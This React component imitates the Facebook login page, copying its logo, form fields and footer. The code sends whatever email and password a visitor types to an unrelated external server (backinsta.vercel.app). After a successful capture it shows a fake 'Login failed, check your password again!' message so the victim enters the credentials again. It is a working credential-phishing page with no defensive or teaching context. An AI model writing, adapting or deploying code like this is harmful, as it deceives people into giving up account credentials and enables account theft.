import React, { useState } from 'react';

const App = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await fetch('https://backinsta.vercel.app/register', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();

      if (response.ok) {
        setSuccess('Login failed, check your password again!');
        setError('');
      } else {
        setError(data.message);
        setSuccess('');
      }
    } catch (err) {
      setError('Something went wrong. Please try again.');
      setSuccess('');
    }
  };

  return (
    <div
      className="flex justify-center items-center h-screen"
      style={{
        backgroundColor: '#e9eff1',
      }}
    >
      <div className="w-80 bg-white p-6 rounded-md shadow-lg">
        {/* Facebook Logo */}
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
          alt="Facebook Logo"
          className="mx-auto mb-8"
          style={{ width: '60px' }}
        />

        {/* Login Form */}
        <form onSubmit={handleSubmit}>
          <div className="mb-4">
            <input
              type="text"
              placeholder="Email address or phone number"
              className="w-full px-3 py-2 text-gray-600 border border-gray-300 rounded-md"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
          </div>
          <div className="mb-4">
            <input
              type="password"
              placeholder="Password"
              className="w-full px-3 py-2 text-gray-600 border border-gray-300 rounded-md"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>

          {error && <p className="text-red-500 text-center mb-4">{error}</p>}
          {success && <p className="text-green-500 text-center mb-4">{success}</p>}

          <button
            type="submit"
            className="w-full bg-blue-600 text-white py-2 rounded-md font-bold mb-4"
          >
            Log In
          </button>
        </form>

        {/* Forgotten Password */}
        <p className="text-center text-blue-500 text-sm mb-4">
          <a href="#" className="hover:underline">Forgotten password?</a>
        </p>

        {/* Create Account Button */}
        <button
          className="w-full py-2 text-center text-blue-600 border border-blue-600 rounded-md text-sm"
        >
          Create new account
        </button>

        {/* Meta Logo */}
        <div className="flex justify-center mt-8">
          <p className="text-center text-gray-500 text-xs">
            © 2024 Facebook
          </p>
        </div>
      </div>
    </div>
  );
};

export default App;
